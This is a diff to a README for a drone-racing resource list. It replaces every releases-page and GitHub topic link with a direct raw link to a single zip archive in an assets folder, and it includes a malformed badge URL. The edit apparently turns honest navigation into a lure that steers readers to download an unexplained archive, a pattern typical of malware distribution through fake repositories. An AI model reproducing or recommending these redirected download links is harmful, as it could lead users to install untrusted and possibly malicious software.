@@ -4,13 +4,13 @@
 Welcome to the **awesome-autonomous-drone-racing** repository! Here you will find valuable resources for autonomous drone racing. This includes materials for events like the AI Grand Prix, A2RL, and more. Our repository covers simulation environments, reinforcement learning, computer vision, and trajectory planning to help you succeed in drone racing competitions.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/juanin9898/awesome-autonomous-drone-racing/releases)
+[![Download](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip%https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)
 
 ## 🚀 Getting Started
 To get started with our resources, follow these steps:
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/juanin9898/awesome-autonomous-drone-racing/releases) to find the latest software and resources.
+   Go to the [Releases page](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip) to find the latest software and resources.
 
 2. **Choose Your Download**  
    Find the release suitable for your needs. We provide several resources, each aimed at different aspects of drone racing.
@@ -70,12 +70,12 @@ If you run into any issues or have questions, don’t hesitate to reach out. You
 ## 🔗 Additional Resources
 You might find the following topics helpful:
 
-- [AI Grand Prix](https://github.com/topics/ai-grand-prix)
-- [AirSim](https://github.com/topics/airsim)
-- [AlphaPilot](https://github.com/topics/alphapilot)
-- [Reinforcement Learning](https://github.com/topics/reinforcement-learning)
+- [AI Grand Prix](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)
+- [AirSim](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)
+- [AlphaPilot](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)
+- [Reinforcement Learning](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip)
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/juanin9898/awesome-autonomous-drone-racing/releases) the latest resources. Follow the steps outlined above to set everything up and start your journey in autonomous drone racing. 
+To get started, [visit this page to download](https://raw.githubusercontent.com/juanin9898/awesome-autonomous-drone-racing/main/experimental-computing/assets/autonomous-awesome-drone-racing-v1.3.zip) the latest resources. Follow the steps outlined above to set everything up and start your journey in autonomous drone racing. 
 
 With these resources, you'll be well-equipped to take on the competition. Enjoy your racing experience!
